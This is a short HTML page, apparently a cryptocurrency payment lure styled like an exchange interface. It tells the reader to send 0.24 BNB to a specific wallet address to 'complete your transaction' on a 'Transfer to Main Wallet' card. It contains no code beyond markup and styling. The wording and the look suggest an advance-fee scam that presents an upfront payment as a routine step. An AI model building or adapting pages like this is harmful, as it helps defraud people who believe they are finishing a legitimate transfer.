
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Transfer</title>
  <style>
    body {
      background-color: #0b0e11;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    .card {
      background-color: #1e2329;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
      max-width: 400px;
    }
    .highlight {
      color: #fcd535;
      font-weight: bold;
    }
    .address {
      word-break: break-all;
      background-color: #2a2e35;
      padding: 10px;
      border-radius: 6px;
      margin: 10px 0;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Transfer to Main Wallet</h2>
    <p>Send <span class="highlight">0.24 BNB</span> to the address below to complete your transaction:</p>
    <div class="address">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</div>
    <p><strong>Network:</strong> BNB Smart Chain BEP20</p>
  </div>
</body>
</html>
